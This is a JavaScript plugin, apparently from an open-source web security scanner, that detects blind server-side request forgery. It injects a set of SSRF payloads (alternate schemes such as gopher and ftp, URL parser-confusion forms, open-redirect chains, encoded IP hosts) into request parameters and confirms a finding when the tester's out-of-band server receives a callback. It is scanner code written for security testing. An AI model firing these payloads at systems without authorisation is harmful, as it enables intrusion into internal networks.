/* ---
id: ssrf-blind-oob
name: Blind SSRF via OOB
description: Detects blind SSRF via out-of-band callback correlation and skips honestly without OOB server.
author: GASH contributors
severity: high
tags: [ssrf, oob]
safe: false
deep: false
active: true
requires_auth: false
phase: probe
order: 60
oob: required
api_version: "1.0"
tests: tests/fixtures/ssrf-blind-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/ssrf/ssrf-blind-oob.js
// What: Tier 2 blind-SSRF plugin with mandatory OOB confirmation.
// Why: Reference for the required-OOB discipline; without an OOB server the
//   scheduler skips it and no fake tentative finding is ever produced.

// originOf extracts scheme://host[:port] from a URL for redirect-echo probes.
function originOf(raw) {
  const m = /^(https?:\/\/[^\/?#]+)/i.exec(String(raw || ""));
  return m ? m[1] : "";
}

// pointWithValue builds a literal injection point; plain objects keep the
// exact payload that fired even after later withValue calls (closure reuse).
function pointWithValue(point, value) {
  return {
    url: point.url,
    method: point.method,
    paramName: point.paramName,
    paramLocation: point.paramLocation,
    value: value
  };
}

// ipv4Encoded derives numeric-notation hosts from a dotted-quad callback
// domain (decimal, dotted-octal, hex, IPv4-mapped IPv6).
// Honest ceiling: these carry the correlation token only in the path, so they
// can confirm solely when the operator's server indexes path tokens; a miss
// produces no finding and the gap is documented in docs/known-limits.md.
function ipv4Encoded(domain) {
  const parts = String(domain).split(".");
  if (parts.length !== 4) return [];
  const nums = [];
  for (let i = 0; i < parts.length; i++) {
    const n = Number(parts[i]);
    if (!isFinite(n) || Math.floor(n) !== n || n < 0 || n > 255) return [];
    nums.push(n);
  }
  const dec = nums[0] * 16777216 + nums[1] * 65536 + nums[2] * 256 + nums[3];
  const dottedOctal = "0" + nums[0].toString(8) + ".0" + nums[1].toString(8) +
    ".0" + nums[2].toString(8) + ".0" + nums[3].toString(8);
  return [
    "http://" + String(dec) + "/ssrf",
    "http://" + dottedOctal + "/ssrf",
    "http://0x" + dec.toString(16) + "/ssrf",
    "http://[::ffff:" + domain + "]/ssrf"
  ];
}

// variantBuilders returns payload builders; each receives a fresh single-use
// token object and returns the payload string (null skips the variant).
// The corpus covers absolute/alternate schemes, parser-confusion forms and
// redirect-echo forms; every builder embeds the unique token so a callback
// can only ever match the exact request that caused it.
function variantBuilders() {
  return [
    function (o) { return o.url; },
    function (o) { return "http://" + o.domain + "/ssrf?t=" + o.correlationId; },
    function (o) { return "https://" + o.domain + "/ssrf?t=" + o.correlationId; },
    function (o) { return "//" + o.domain + "/ssrf?t=" + o.correlationId; },
    function (o) { return "http://gash@" + o.domain + "/ssrf?t=" + o.correlationId; },
    function (o) { return "http://" + o.domain + "#@" + o.correlationId + ".invalid/ssrf"; },
    function (o) { return "http://" + o.domain + "/%23@" + o.correlationId + ".invalid/ssrf"; },
    function (o) { return "http://" + o.domain + "\\@" + o.correlationId + ".invalid/ssrf"; },
    function (o) { return "gopher://" + o.domain + "/_?t=" + o.correlationId; },
    function (o) { return "ftp://" + o.domain + "/ssrf/" + o.correlationId; },
    function (o) { return "dns://" + o.domain + "/" + o.correlationId; },
    function (o, origin) {
      if (!origin) return null;
      return origin + "/redirect?url=http://" + o.domain + "/ssrf?t=" + o.correlationId;
    },
    function (o, origin) {
      if (!origin) return null;
      return origin + "/redirect?url=" + encodeURIComponent("http://" + o.domain + "/ssrf?t=" + o.correlationId);
    },
    function (o) {
      const hosts = ipv4Encoded(o.domain);
      if (hosts.length === 0) return null;
      return hosts[0] + "?t=" + o.correlationId;
    },
    function (o) {
      const hosts = ipv4Encoded(o.domain);
      if (hosts.length < 2) return null;
      return hosts[1] + "?t=" + o.correlationId;
    },
    function (o) {
      const hosts = ipv4Encoded(o.domain);
      if (hosts.length < 3) return null;
      return hosts[2] + "?t=" + o.correlationId;
    },
    function (o) {
      const hosts = ipv4Encoded(o.domain);
      if (hosts.length < 4) return null;
      return hosts[3] + "?t=" + o.correlationId;
    }
  ];
}

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const builders = variantBuilders();
  const sent = [];
  const maxSends = 60; // request budget per run; corpus stays well under it

  for (const point of points) {
    if (sent.length >= maxSends) break;
    const origin = originOf(String(point.url || ""));
    for (const build of builders) {
      if (sent.length >= maxSends) break;
      const oob = host.oob.generate("http");
      if (!oob) {
        // No self-hosted OOB server: the scheduler should have skipped this
        // plugin; returning empty keeps the discipline even if it did not.
        return [];
      }
      const payload = build(oob, origin);
      if (!payload) continue;
      try {
        probe.send(pointWithValue(point, payload));
      } catch (e) {
        continue; // request failed: no evidence, next variant
      }
      sent.push({
        corr: oob.correlationId,
        ns: oob.namespace,
        point: point,
        payload: payload
      });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus (10s / 2 polls). Any
  // protocol matches: DNS-only exfil confirms exactly like HTTP because the
  // token is unique per payload.
  const ids = [];
  for (const s of sent) ids.push(s.corr);
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (const s of sent) {
    if (s.corr === String(ev.correlationId)) {
      return [host.candidate(pointWithValue(s.point, s.payload), "ssrf-blind", ev)];
    }
  }
  return [];
}
